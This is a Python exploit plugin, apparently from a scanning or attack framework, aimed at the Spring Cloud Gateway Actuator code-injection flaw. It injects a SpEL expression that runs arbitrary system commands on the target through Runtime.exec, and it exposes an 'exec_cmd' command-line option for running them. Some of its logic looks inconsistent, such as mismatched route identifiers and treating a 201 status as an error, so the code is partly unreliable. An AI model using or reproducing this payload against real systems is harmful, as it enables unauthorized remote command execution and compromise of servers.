# -*-* coding:UTF-8
import re
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "Spring Cloud GateWay 远程代码执行漏洞",
        "description": "Spring Cloud Gateway应用程序的Actuator端点，在启用、公开和不安全的情况下容易受到代码注入的攻击。攻击者可利用该漏洞通过恶意创建允许在远程主机上执行任意远程请求",
        "references": ["https://www.freebuf.com/vuls/326868.html"],
    }

    def url(self) -> dict:
        random_str = self.build_random_str(12)
        res = self.exec_cmd(self.target.url, f'echo {random_str}')
        if res and random_str in res:
            return {"LoopholeInfo": self.__info__}

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        random_str = self.build_random_str(12)
        r = self.request(
            method='post',
            url=urllib.parse.urljoin(url, f'./actuator/gateway/routes/WeianSec'),
            json={
                "id": random_str,
                "filters": [{
                    "name": "AddResponseHeader",
                    "args": {
                        "name": "Result",
                        "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{%s}).getInputStream()))}" % cmd
                    }
                }],
                "uri": self.target.value
            },
            headers={'Content-Type': 'application/json'},
            timeout=15,
        )
        if r.status_code == 201:
            self.log.error("create route error")
            return
        self.request(
            method='post',
            url=urllib.parse.urljoin(url, './actuator/gateway/refresh'),
            timeout=15
        )
        r = self.request(
            method='get',
            url=urllib.parse.urljoin(url, f'./actuator/gateway/routes/{random_str}'),
            timeout=15
        )
        find = re.findall(r"Result\s=\s'(.+)']", r.text)
        if not find:
            return
        result = find[0].encode("utf-8").decode("unicode_escape")
        r = self.request(
            method='delete',
            url=urllib.parse.urljoin(url, f'./actuator/gateway/routes/{random_str}'),
            timeout=15
        )
        if r.status_code != 200:
            self.log.error("delete route error")
        return result
